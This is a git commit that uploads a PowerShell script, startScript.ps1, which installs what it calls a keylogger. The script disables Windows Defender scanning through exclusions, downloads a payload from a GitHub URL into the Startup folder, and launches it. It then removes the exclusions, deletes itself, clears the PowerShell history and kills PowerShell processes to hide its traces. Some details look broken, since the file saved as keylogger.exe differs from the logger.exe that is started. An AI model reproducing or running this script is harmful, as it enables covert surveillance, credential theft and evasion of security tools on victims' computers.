e89df4b31ee46784da0821fdeeeef5f7ba6a1709
urinfected <155595205+urinfected@users.noreply.github.com>
2024-01-04 01:19:18 +0000

    Add files via upload

---
+++ startScript.ps1
@@ -0,0 +1,11 @@
+Set-Location $env:APPDATA\Microsoft\Windows\"Start Menu"\Programs\Startup
+Add-MpPreference -ExclusionExtension exe -Force
+Invoke-WebRequest https://github.com/urinfected/peepingTom-.git -O keylogger.exe #Download keylogger script
+Add-MpPreference -ExclusionPath $env:APPDATA\Microsoft\Windows\"Start Menu"\Programs\Startup\logger.exe -Force
+Start-Process logger.exe
+Remove-MpPreference -ExclusionExtension exe -Force
+Remove-MpPreference -ExclusionExtension ps1 -Force
+Set-ExecutionPolicy restricted -Force #Reset script execution policy
+Remove-Item C:\Users\Public\Documents\startScript.ps1 #Delete ps1 script
+Clear-Content (Get-PSReadlineOption).HistorySavePath #Clear powershell command history
+taskkill -F /IM powershell.exe #Kill all powershell process
